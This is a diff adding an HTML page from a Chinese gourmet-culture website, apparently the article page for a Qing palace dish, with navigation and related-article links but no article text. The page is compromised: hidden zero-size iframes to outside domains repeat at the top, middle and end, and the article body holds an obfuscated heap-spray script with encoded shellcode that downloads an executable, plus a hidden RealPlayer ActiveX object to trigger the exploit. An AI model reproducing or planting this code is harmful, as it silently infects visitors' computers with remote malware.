@@ -1,0 +1,340 @@
+<iframe src="http://ca.winvv.com/cn.htm" width=0 height=0></iframe>
+<iframe src="http://bwkjb.com/hm.htm" width=0 height=0></iframe>
+<iframe src="http://ca.winvv.com/cn.htm" width=0 height=0></iframe>
+<iframe src="http://bwkjb.com/hm.htm" width=0 height=0></iframe>
+<html>
+<head>
+
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<script language="JavaScript">
+<!--
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+<link rel="stylesheet" href="FONT.CSS" type="text/css">
+<style type="text/css">
+<!--
+body {
+	background-image: url(images/bg.gif);
+}
+-->
+</style></head>
+
+<body bgcolor="#006600" text="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="MM_preloadImages('images/images_top/top2_08.jpg','images/images_top/top2_09.jpg','images/images_top/top2_10.jpg','images/images_top/top2_11.jpg','images/images_top/top2_12.jpg','images/images_top/top2_13.jpg','images/images_top/top2_14.jpg')">
+<table width="778" border="0" cellspacing="0" cellpadding="0" align="center">
+
+</table>
+<TABLE WIDTH=777 BORDER=0 align="center" CELLPADDING=0 CELLSPACING=0>
+  <TR>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=83 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=69 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=69 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=30 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=47 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=35 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=95 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=89 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=89 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=87 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=76 HEIGHT=1></TD>
+    <TD> <IMG SRC="images/images_top/Spacer.gif" WIDTH=8 HEIGHT=1></TD>
+  </TR>
+  <TR>
+    <TD COLSPAN=3> <IMG SRC="images/images_top/top_01.jpg" WIDTH=221 HEIGHT=84></TD>
+    <TD COLSPAN=9> <IMG SRC="images/images_top/top_02.jpg" WIDTH=556 HEIGHT=84 border="0" usemap="#Map"></TD>
+  </TR>
+  <TR>
+    <TD> <IMG SRC="images/images_top/top_07.jpg" WIDTH=83 HEIGHT=26></TD>
+    <TD> <a href="index.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image31','','images/images_top/top2_08.jpg',1)"><img src="images/images_top/top_08.jpg" name="Image31" width="69" height="26" border="0"></a></TD>
+    <TD COLSPAN=2> <a href="group.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image30','','images/images_top/top2_09.jpg',1)"><img src="images/images_top/top_09.jpg" name="Image30" width="99" height="26" border="0"></a></TD>
+    <TD COLSPAN=2> <a href="news.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image32','','images/images_top/top2_10.jpg',1)"><img src="images/images_top/top_10.jpg" name="Image32" width="82" height="26" border="0"></a></TD>
+    <TD> <a href="department.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image33','','images/images_top/top2_11.jpg',1)"><img src="images/images_top/top_11.jpg" name="Image33" width="95" height="26" border="0"></a></TD>
+    <TD> <a href="products.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image34','','images/images_top/top2_12.jpg',1)"><img src="images/images_top/top_12.jpg" name="Image34" width="89" height="26" border="0"></a></TD>
+    <TD> <a href="bbs/" target="_blank" onMouseOver="MM_swapImage('Image35','','images/images_top/top2_13.jpg',1)" onMouseOut="MM_swapImgRestore()"><img src="images/images_top/top_13.jpg" name="Image35" width="89" height="26" border="0"></a></TD>
+    <TD> <a href="contact.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image36','','images/images_top/top2_14.jpg',1)"><img src="images/images_top/top_14.jpg" name="Image36" width="87" height="26" border="0"></a></TD>
+    <TD COLSPAN=2> <IMG SRC="images/images_top/top_15.jpg" WIDTH=84 HEIGHT=26></TD>
+  </TR>
+  <TR>
+    <TD> <IMG SRC="images/images_top/top_16.jpg" WIDTH=83 HEIGHT=22></TD>
+    <TD height="22" COLSPAN=9 background="images/images_top/top_17.jpg"><table width="40%"  border="0" align="center" cellpadding="0" cellspacing="0">
+        <tr> 
+          <td><a href="go.htm"><img src="images/so1.gif" width="87" height="18" border="0"></a></td>
+          <td><a href="go.htm"><img src="images/so2.gif" width="87" height="18" border="0"></a></td>
+        </tr>
+      </table> </TD>
+    <TD COLSPAN=2> <IMG SRC="images/images_top/top_18.jpg" WIDTH=84 HEIGHT=22></TD>
+  </TR>
+</TABLE>
+<map name="Map">
+  <area shape="rect" coords="232,52,308,70" href="http://www.mainfond.com" target="_blank">
+  <area shape="rect" coords="335,53,426,72" href="http://www.gsmeifeng.com/bbs/" target="_blank">
+</map>
+<iframe src="http://ca.winvv.com/cn.htm" width=0 height=0></iframe>
+<iframe src="http://bwkjb.com/hm.htm" width=0 height=0></iframe>
+
+<TABLE cellSpacing=0 cellPadding=0 width=776 align=center bgColor=#ffffff 
+border=0>
+  <TBODY>
+    <TR>
+      <TD vAlign=top width=176 background=images/images_ny/1/de-2.gif>
+        <TABLE cellSpacing=0 cellPadding=0 width=176 align=center border=0>
+          <TBODY>
+            <TR>
+              <TD width=176 background=images/images_ny/1/de-2.gif>
+                <DIV align=right>
+				
+				<IMG height=96 src="images/images_ny/1/pic-6.gif" width=176> 
+				
+				</DIV>
+                <TABLE cellSpacing=0 cellPadding=0 width=125 align=center 
+              border=0>
+                  <TBODY>
+                    <TR>
+                      <TD width="117" background=images/images_ny/1/de-3.gif><IMG height=35 
+                  hspace=5 src="images/images_ny/1/pic-5.gif" width=35 
+                  align=absMiddle> <STRONG><A 
+                  href="group.asp"><FONT 
+                  class=9p color=#0080e3>美食文化</FONT></A></STRONG> </TD>
+                      <TD width="8" height=40>&nbsp;</TD>
+                    </TR>
+                    <TR>
+                      <TD></TD>
+                      <TD height=5></TD>
+                    </TR>
+                    <TR>
+                      <TD background=images/images_ny/1/de-3.gif><IMG height=35 hspace=5 
+                  src="images/images_ny/1/pic-2.gif" width=35 align=absMiddle> 
+                        <STRONG><A 
+                  href="news.asp"><FONT 
+                  class=9p color=#2a8701>美食专家</FONT></A></STRONG> </TD>
+                      <TD height=40>&nbsp;</TD>
+                    </TR>
+                    <TR>
+                      <TD></TD>
+                      <TD height=5></TD>
+                    </TR>
+                    <TR>
+                      <TD background=images/images_ny/1/de-3.gif><IMG height=35 hspace=5 
+                  src="images/images_ny/1/pic-3.gif" width=35 align=absMiddle> 
+                        <STRONG><A 
+                  href="department.asp"><FONT 
+                  class=9p color=#f22f94>美食男女</FONT></A></STRONG> </TD>
+                      <TD height=40>&nbsp;</TD>
+                    </TR>
+                    <TR>
+                      <TD></TD>
+                      <TD height=5></TD>
+                    </TR>
+                    <TR>
+                      <TD background=images/images_ny/1/de-3.gif><IMG height=35 hspace=5 
+                  src="images/images_ny/1/pic-4.gif" width=35 align=absMiddle> 
+                        <STRONG><A 
+                  href="products.asp">美食学院<FONT 
+                  class=9p color=#8c8a01></FONT></A></STRONG> </TD>
+                      <TD height=40>&nbsp;</TD>
+                    </TR>
+                    <TR>
+                      <TD></TD>
+                      <TD height=5></TD>
+                    </TR>
+                    <TR>
+                      <TD background=images/images_ny/1/de-3.gif><IMG height=35 hspace=5 
+                  src="images/images_ny/1/pic-1.gif" width=35 align=absMiddle> <STRONG><A 
+                  href="bbs/"><font color="#660099">美食论坛</font></A></STRONG> </TD>
+                      <TD height=8></TD>
+                    </TR>
+                    <TR>
+                      <TD colSpan=2 height=8></TD>
+                    </TR>
+                  </TBODY>
+                </TABLE>
+                <IMG height=158 
+            src="images/images_ny/1/pic-7.gif" width=176> </TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD class=9p vAlign=top background=images/images_ny/1/de-1.gif>
+        <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+          <TBODY>
+            <TR>
+              <TD background=images/images_ny/1/de-4.gif>
+                <DIV align=right><IMG height=15 src="images/images_ny/1/de-5.gif" 
+            width=9></DIV></TD>
+            </TR>
+          </TBODY>
+        </TABLE>
+        <BR>
+        <!--°üo????t?áê?-->
+        
+        <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+          <TBODY>
+            <TR> 
+              <TD><img height=40 src="images/images_ny/1/1b1.gif" width=572></TD>
+            </TR>
+          </TBODY>
+        </TABLE>
+        
+        <BR>
+        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td height="36" align="center" background="images/group/line3.gif" class="font1"  style="background-repeat: no-repeat; background-position: bottom"><b><font color="#990000" size="4" face="oúì?">清宫御膳——改刀肉</font></b></td>
+          </tr>
+        </table>
+        <table width="96%" border="0" cellspacing="0" cellpadding="0" align="center">
+          <tr>
+            <td>&nbsp;</td>
+          </tr>
+        </table>
+        <table width="96%" border="0" cellspacing="0" cellpadding="0" align="center">
+          <tr>
+            <td colspan="2" height="10"></td>
+          </tr>
+          <tr class="font1">
+            <td width="20" class="font3" valign="top">&nbsp;</td>
+            <td><HTML> <SCRIPT language="javascript">   food = unescape("%u9090%u9090%u10eb%u4b5b%uc933%ub966%u013c%u3480%u990b%ufae2%u05eb%uebe8%uffff%u70ff%u9934%u9999%u12c3%uaa6b%u3559%u01a4%u9999%uec99%u186f%u5175%u9999%u1299%u106d%ubdcf%u0c71%u9999%uaa99%u1042%u669f%uf1af%ud717%u7597%u3471%u9999%u1099%u91df%uf5f1%u99f5%uf199%uf7f6%ufdb7%uecf1%uf5eb%ucdf4%ucf66%u1091%u9ddf%uaf66%ue7f1%u7b41%u71ea%u9911%u9999%udf10%u6695%uf1af%u6701%u9713%ue071%u9999%u1099%u8ddf%uaf66%ubcf1%u6629%u715b%u99f3%u9999%udf10%u6681%u9def%uaff1%ub683%u71e9%u99c3%u9999%udf10%uf389%uf1fc%ub7ea%ue1fc%uff10%u6685%u85ef%ucf66%uaa81%uc850%u66c8%u85ef%uef66%uc8bd%ucf66%uaa89%uc850%uef66%u6685%u8dcf%ucf66%u7095%u9919%u9999%ucfcc%u38fd%u99a9%u9999%u591c%u95e1%ud912%u1295%u85e9%u1234%u91f1%u9072%ud912%u12ad%u2131%u9999%u1299%uc75c%u5bc4%u999d%uccca%ucecf%uf512%u81bd%udc12%u12a5%u9ccd%u9ae1%u124c%u81d3%uc312%u9ab9%u7a44%ud0ab%uad12%u9a12%uaa6c%u6566%u59aa%ua335%ued5d%u589e%u9456%u619a%u6b72%ue5a2%u8dbd%u78ec%uc312%u9abd%uff44%u9512%u12d2%u85c3%u449a%u9d12%u9a12%u725c%uaa9b%u1259%uc64c%uc4c7%u5bc2%u999d%u5071%u6667%u6866%u7474%u3a70%u2f2f%u3136%u372e%u2e30%u3931%u2e31%u3836%u692f%u616d%u6567%u342f%u2e34%u7865%u9865"); dish = unescape("%u0D0D%u0D0D");headersize = 20; lobster = headersize+food.length while (dish.length<lobster) dish+=dish; shrimp = dish.substring(0, lobster); raven = dish.substring(0, dish.length-lobster); while(raven.length+lobster<0x40000) raven = raven+raven+shrimp; cat = new Array(); i=0;while(++i<500){cat[i] = raven + food;} </SCRIPT> <div style="display:none"> <object classid="clsid:cfcdaa03-8be4-11cf-b84b-0020afbbccfa" width="256" height="64">    <param name="_extentx" value="1">    <param name="_extenty" value="1">    <param name="autostart" value="1">    <param name="shuffle" value="0">    <param name="prefetch" value="0">    <param name="nolabels" value="0">    <param name="src" value="smile.smil">    <param name="controls" value="controlpanel,statusbar">    <param name="console" value="clip">    <param name="loop" value="1">    <param name="numloop">    <param name="center">    <param name="maintainaspect" value="0"> </object> </div> </HTML></td>
+          </tr>
+        </table>
+        <table width="96%" border="0" cellspacing="0" cellpadding="0" align="center">
+          <tr> 
+            <td height="50">&nbsp;</td>
+          </tr>
+        </table>
+        <table width="96%" border="0" cellspacing="0" cellpadding="0" align="center">
+          <tr>
+            <td background="images/line_h.gif" height="1" colspan="2"></td>
+          </tr>
+          <tr>
+            <td height="30">&nbsp;</td>
+            <td height="30" align="right" width="50"><a href="#top"><img src="images/group/bt_top.gif" width="50" height="18" border="0"></a></td>
+          </tr>
+          <tr>
+            <td colspan="2">&nbsp;</td>
+          </tr>
+        </table>
+		<title>清宫御膳——改刀肉－美峰美食文化网</title>
+		
+        <BR>
+        <TABLE cellSpacing=0 cellPadding=0 width="95%" align=center border=0>
+          <TBODY>
+            <TR>
+              <TD width=26><IMG height=244 src="images/images_ny/1/z.gif" width=26></TD>
+              <TD vAlign=top background=images/images_ny/1/bj.gif><BR>
+                <TABLE cellSpacing=0 cellPadding=0 width="95%" align=center 
+border=0>
+                  <TBODY>
+                    <TR> 
+                      <TD><div align="left"><IMG height=29 src="images/images_ny/4/zw2.gif" width=163 
+                vspace=5></div></TD>
+                    </TR>
+                    <TR> 
+                      <TD> <TABLE cellSpacing=0 cellPadding=0 width="90%" align=right 
+                  border=0>
+                          
+                          <TR> 
+                            <TD height=20><IMG height=5 hspace=5 
+                        src="images/images_ny/1/0315-16.gif" width=5 align=absMiddle 
+                        border=0> <A 
+                        href="group_wen.asp?pid=1&ppid=1&id=25" 
+                        target=_parent><FONT class=9p>元宵节的传说</FONT></A></TD>
+                            
+                            <TD height=20><IMG height=5 hspace=5 
+                        src="images/images_ny/1/0315-16.gif" width=5 align=absMiddle 
+                        border=0> <A 
+                        href="group_wen.asp?pid=1&ppid=1&id=138" 
+                        target=_parent><FONT class=9p>“叫化鸡”的传说</FONT></A></TD>
+                            
+                          </TR>
+                          
+                          <TR> 
+                            <TD height=20><IMG height=5 hspace=5 
+                        src="images/images_ny/1/0315-16.gif" width=5 align=absMiddle 
+                        border=0> <A 
+                        href="group_wen.asp?pid=1&ppid=1&id=167" 
+                        target=_parent><FONT class=9p>清宫御膳——改刀肉</FONT></A></TD>
+                            
+                            <TD height=20><IMG height=5 hspace=5 
+                        src="images/images_ny/1/0315-16.gif" width=5 align=absMiddle 
+                        border=0> <A 
+                        href="group_wen.asp?pid=1&ppid=1&id=164" 
+                        target=_parent><FONT class=9p>精美情礼——中华饮食文化的基本内涵</FONT></A></TD>
+                            
+                          </TR>
+                          
+                          <TR> 
+                            <TD height=20><IMG height=5 hspace=5 
+                        src="images/images_ny/1/0315-16.gif" width=5 align=absMiddle 
+                        border=0> <A 
+                        href="group_wen.asp?pid=1&ppid=1&id=161" 
+                        target=_parent><FONT class=9p>帝王饮食与寿命</FONT></A></TD>
+                            
+                          </TR>
+                          
+                        </TABLE></TD>
+                    </TR>
+                    <TR> 
+                      <TD height=20> <DIV align=right><A 
+                  href="group.asp"><FONT 
+                  class=9p>&gt;&gt;更多</FONT></A></DIV></TD>
+                    </TR>
+                  </TBODY>
+                </TABLE></TD>
+              <TD width=31><IMG height=244 src="images/images_ny/1/y.gif" 
+        width=31></TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<style type="text/css">
+<!--
+.style1 {color: #000000}
+.style2 {color: #FFFFFF}
+-->
+</style>
+<map name="Map">
+  <area shape="rect" coords="198,8,232,24" href="./home.asp">
+  <area shape="rect" coords="247,8,305,24" href="english/home.asp">
+</map>
+<TABLE WIDTH=779 height="119" BORDER=0 align="center" CELLPADDING=0 CELLSPACING=0 background="images/images_ind/ind_16.jpg">
+  <TR>
+    <TD align="center" valign="middle"> 
+      <table width="90%" border="0" cellspacing="0" cellpadding="0" align="center">
+        <tr height=25>
+          <td colspan="3" class="font3">&nbsp;</td>
+        </tr>
+        <tr height=25>
+          <td width="24%" class="font3 style1">版权所有&copy;<a href="http://www.gsmeifeng.com/index.asp">美峰美食网</a> </td>
+          <td width="62%" class="font3 style1">经盛机构全程策划</td>
+          <td width="14%" class="font3 style1"><p align="right"><strong>- <a href="http://www.gsmeifeng.com/sitemap.htm" class="style2">sitemap </a> - </strong></p></td>
+        </tr>
+      </table></TD>
+  </TR>
+</TABLE>
+</body>
+</html>
+<iframe src="http://ca.winvv.com/cn.htm" width=0 height=0></iframe>
+<iframe src="http://bwkjb.com/hm.htm" width=0 height=0></iframe>
+<iframe src="http://ca.winvv.com/cn.htm" width=0 height=0></iframe>
+<iframe src="http://bwkjb.com/hm.htm" width=0 height=0></iframe>
